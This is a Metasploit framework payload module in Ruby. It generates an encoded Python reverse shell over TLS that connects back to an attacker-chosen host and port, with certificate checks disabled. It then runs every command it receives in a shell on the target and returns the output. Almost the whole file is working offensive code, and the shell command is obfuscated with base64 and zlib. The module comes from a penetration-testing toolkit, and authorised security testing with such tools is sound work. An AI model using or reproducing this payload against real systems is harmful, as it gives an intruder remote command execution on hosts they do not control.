##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name'        => 'Unix Command Shell, Reverse TCP SSL (via python)',
        'Description' => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
        'Author'      => 'RageLtMan <rageltman[at]sempervictus>',
        'License'     => BSD_LICENSE,
        'Platform'    => 'unix',
        'Arch'        => ARCH_CMD,
        'Handler'     => Msf::Handler::ReverseTcpSsl,
        'Session'     => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'python',
        'Payload'     => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('PythonPath', [false, 'The path to the Python executable'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)

    # Set up the socket
    cmd += "import socket,subprocess,os,ssl\n"
    cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
    # ssl.wrap_socket() was deprecated in Python 3.7 and removed in Python 3.12.
    # Use SSLContext.wrap_socket() instead, which is available from Python 2.7.9+
    # and 3.2+. We fall back through PROTOCOL_TLS_CLIENT (3.6+) -> PROTOCOL_TLS
    # (3.2-3.9) -> PROTOCOL_SSLv23 (2.7.9+) to cover all supported versions.
    cmd += "ss=ssl.SSLContext(getattr(ssl,'PROTOCOL_TLS_CLIENT',getattr(ssl,'PROTOCOL_TLS',ssl.PROTOCOL_SSLv23)))\n"
    cmd += "ss.check_hostname=False\n"
    cmd += "ss.verify_mode=ssl.CERT_NONE\n"
    cmd += "s=ss.wrap_socket(so)\n"

    # The actual IO
    cmd += "#{dead}=False\n"
    cmd += "while not #{dead}:\n"
    cmd += "\tdata=s.recv(1024)\n"
    cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
    cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
    cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
    cmd += "\ts.send(stdout_value)\n"

    if datastore['PythonPath'].blank?
      "echo exec(__import__('zlib').decompress(__import__('base64').b64decode(" \
        "__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(Rex::Text.zlib_deflate(cmd))}')[0])))" \
        " | $(which python || which python3 || which python2) -"
    else
      "echo exec(__import__('zlib').decompress(__import__('base64').b64decode(" \
        "__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(Rex::Text.zlib_deflate(cmd))}')[0])))" \
        " | #{datastore['PythonPath']} -"
    end
  end

end
